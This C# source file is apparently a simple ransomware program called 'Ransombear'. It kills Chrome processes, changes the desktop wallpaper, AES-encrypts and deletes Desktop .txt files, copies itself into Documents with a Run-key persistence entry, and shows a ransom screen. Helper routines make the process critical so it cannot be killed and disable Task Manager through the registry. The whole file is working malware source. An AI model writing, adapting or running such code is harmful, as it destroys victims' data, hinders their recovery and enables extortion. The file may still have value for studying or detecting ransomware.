using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;

namespace cwg.sourceIL
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
  
            //Kill all Processes for the current user
            KillAllProcess();

            Uri wallpaper = new Uri("https://wallpapercave.com/wp/wp2665744.jpg");

            //change background wallpaper
            Wallpaper.Set(wallpaper, Wallpaper.Style.Stretched);

            //Encrypt the files
            EncryptFiles();

            //Copy file to documents directory and create persistence
            String fileName = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe");
            String filePath = Path.Combine(Environment.CurrentDirectory, fileName);
            String persistPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), fileName);
            if (File.Exists(persistPath))
            {
                //do nothing
            }
            else
            {
                File.Copy(filePath, persistPath);
            }
            RegisterInStartup(persistPath);
            
            //display the randsom note screen
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());


        }

        //Create Startup Persistence
        private static void RegisterInStartup(String applicationPath)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            registryKey.SetValue("Ransombear", "\"" + applicationPath);
        }

        //for updating the background wallpaper
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 uiAction, UInt32
        uiParam, String pvParam, UInt32 fWinIni);
        private static UInt32 SPI_SETDESKWALLPAPER = 20;
        private static UInt32 SPIF_UPDATEINIFILE = 0x1;


        //encrypt the files
        private static void EncryptFiles()
        {
            IEnumerable<string> files = Enumerable.Empty<string>();
            String password = "ransombear";

            //Create the symmetric key encrypt the files
            Aes aesKey = GenerateSymKey();

            //convert password string to byte arrray
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);

            // Set variable to the c:\ drive.
            string docPath = @"c:\";
            string desktopFilesBackup = @"c:\filesBackup";


            //Copy files from Desktop to the c:\
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            files = Directory.GetFiles(desktopPath);
            DirectoryInfo di = Directory.CreateDirectory(desktopFilesBackup);
            foreach (var srcPath in files)
            {
                if (srcPath.Contains(".txt")) {
                    //Copy the file from sourcepath and place into mentioned target path, 
                    //Overwrite the file if same file is exist in target path
                    File.Copy(srcPath, srcPath.Replace(desktopPath, desktopFilesBackup), true);
                    FileEncrypt(srcPath, password);
                    File.Delete(srcPath);
                }
            }
        }


        public static byte[] GenerateSalt()
        {
            byte[] data = new byte[32];
            using (RNGCryptoServiceProvider rgnCryptoServiceProvider = new RNGCryptoServiceProvider())
            {
                rgnCryptoServiceProvider.GetBytes(data);
            }
            return data;
        }

        private static void FileEncrypt(string inputFile, string password)
        {
            byte[] salt = GenerateSalt();
            byte[] passwords = Encoding.UTF8.GetBytes(password);
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;//aes 256 bit encryption c#
            AES.BlockSize = 128;//aes 128 bit encryption c#
            AES.Padding = PaddingMode.PKCS7;
            var key = new Rfc2898DeriveBytes(passwords, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Mode = CipherMode.CFB;
            using (FileStream fsCrypt = new FileStream(inputFile + ".aes", FileMode.Create))
            {
                fsCrypt.Write(salt, 0, salt.Length);
                using (CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    using (FileStream fsIn = new FileStream(inputFile, FileMode.Open))
                    {
                        byte[] buffer = new byte[1048576];
                        int read;
                        while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                        {
                            cs.Write(buffer, 0, read);
                        }
                    }
                }
            }
        }


        private static RSAParameters GenerateAsymKey()
        {
            //Generate a public/private key pair.  
            RSA rsa = RSA.Create();

            //Save the public key information to an RSAParameters structure.  
            RSAParameters rsaKeyInfo = rsa.ExportParameters(false);

            return rsaKeyInfo;
        }

        //Kill All Proceses for the Current User
        public static void KillAllProcess()
        {
            Process[] processlist = Process.GetProcesses();
            foreach (Process theprocess in processlist)
            {
                String ProcessUserSID = theprocess.StartInfo.EnvironmentVariables["USERNAME"];
                String CurrentUser = Environment.UserName;
                if (ProcessUserSID == CurrentUser && theprocess.ProcessName =="chrome")
                {
                    try
                    {
                        theprocess.Kill();
                    }
                    catch
                    {
                        //ignore execption
                    }
                }
            }
        }

        public static Aes GenerateSymKey()
        {
            //Genearate the symmetric Key
            Aes aesKey = Aes.Create();
            aesKey.GenerateIV();
            aesKey.GenerateKey();
            return aesKey;
        }

        public static class Make
        {
            [DllImport("ntdll.dll", SetLastError = true)]
            private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

            public static void ProcessUnkillable()      // Enabled the "unkillable" feature
            {
                Process.EnterDebugMode();
                RtlSetProcessIsCritical(1, 0, 0);
            }

            public static void ProcessKillable()        // Disables the "unkillable" feature
            {
                RtlSetProcessIsCritical(0, 0, 0);
            }
        }

        // Pretty obvious that this will disable the taskmanager if possible.
        public static void DisableTaskManager()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (objRegistryKey.GetValue("DisableTaskMgr") == null)
            {
                objRegistryKey.SetValue("DisableTaskMgr", "1");
            }
            objRegistryKey.Close();
        }

        // This will re-enable the taskmanager again
        public static void EnableTaskManager()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (objRegistryKey.GetValue("DisableTaskMgr") != null)
            {
                objRegistryKey.DeleteValue("DisableTaskMgr");
            }
            objRegistryKey.Close();
        }

    }
}
